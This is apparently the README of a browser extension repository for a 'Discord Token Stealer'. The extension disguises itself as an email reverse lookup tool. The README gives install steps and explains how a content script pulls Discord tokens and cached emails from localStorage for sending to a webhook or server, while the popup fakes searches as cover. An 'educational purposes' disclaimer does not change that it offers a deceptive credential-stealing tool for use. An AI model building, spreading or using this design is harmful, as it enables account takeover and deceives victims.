# Discord Token Stealer (Browser Extension)

This Chrome extension is a **Discord Token Stealer**, disguised as an email reverse lookup tool. It retrieves Discord tokens and cached emails from `localStorage` whenever the user opens Discord in their browser. 

**For educational purposes only. I am not responsible for any misuse or violations of Discord's Terms of Service (TOS).**

---

## Usage

### Step 1: Clone or Download the Repository
Clone the repository or download the source code:

```bash
git clone https://github.com/croissant-eater/discord-token-stealer-extension.git
```

### Step 2: Load the Extension in Chrome
- Navigate to chrome://extensions in Chrome.
- Enable Developer Mode (top-right corner).
- Click Load unpacked and select the project folder.
- The extension will now be added to Chrome.

### Step 3: Open Discord
Visit Discord in the browser, and the extension will automatically extract tokens and cached email data from `localStorage`.

<br>

## How It Works

The extension's `contentScript.js` is injected into any https://*.discord.com/* page. It retrieves token, tokens, and email_cache which are then sent to the background script.
They can now be sent to a Discord Webhook or a Web Server through HTTPS/SSH.

The frontend of the extension includes a user-facing UI (popup.html) that appears to be an email reverse lookup tool.
When users input an email, the extension simulates a search but does nothing meaningful.
The frontend serves as a disguise to avoid suspicion.


# Warning
This project is for educational purposes only. Unauthorized use of this extension to steal Discord tokens:

1. Violates Discord's Terms of Service.
2. May be illegal depending on your jurisdiction.
3. I take no responsibility for any misuse, damage, or consequences resulting from using this code. Always obtain explicit consent from individuals before conducting any security testing.
